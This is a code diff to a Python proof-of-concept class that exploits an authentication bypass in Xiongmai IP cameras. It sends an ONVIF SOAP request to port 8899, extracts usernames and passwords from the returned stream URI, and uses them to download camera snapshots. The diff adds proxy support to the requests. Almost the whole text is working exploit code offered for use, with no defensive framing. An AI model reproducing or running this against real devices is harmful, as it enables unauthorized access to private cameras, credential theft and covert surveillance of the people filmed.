@@ -17,12 +17,12 @@ class XioingmaiBypass(POCTemplate):
         self.desc = 'Xiongmai authentication bypass'
 
     def verify(self, ip, port=80):
-        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
-        url = f"http://{ip}:8899/onvif/Media"
+        proxies = self._get_proxies()
+        url = self._get_url(ip, 8899, '/onvif/Media')
         headers = {
+            **self._get_headers(),
             "Content-Type": "application/soap+xml; charset=utf-8",
             "Accept-Encoding": "gzip",
-            "User-Agent": "okhttp/3.12.5",
         }
         xml_payload = """
         <?xml version="1.0" encoding="utf-8"?>
@@ -45,7 +45,7 @@ class XioingmaiBypass(POCTemplate):
         </soap:Envelope>
         """
         try:
-            r = requests.post(url, headers=headers, data=xml_payload, verify=False, timeout=self.config.timeout)
+            r = requests.post(url, headers=headers, data=xml_payload, verify=False, timeout=self.config.timeout, proxies=proxies)
             if match := re.search(r'<tt:Uri>(.*?)</tt:Uri>', r.text):
                 link = match.group(1).replace("&amp;", "&")
                 user = re.findall('user=(.*)&', link)
@@ -58,7 +58,7 @@ class XioingmaiBypass(POCTemplate):
 
     def exploit(self, results):
         ip, port, product, user, password, name = results
-        url = f"http://{ip}:{port}/webcapture.jpg?command=snap&channel=1&user={user}&password={password}"
+        url = self._get_url(ip, port, f'/webcapture.jpg?command=snap&channel=1&user={user}&password={password}')
         name = f"{ip}-{port}-{user}-{password}-channel_1.jpg"
         return self._snapshot(url, name)
 
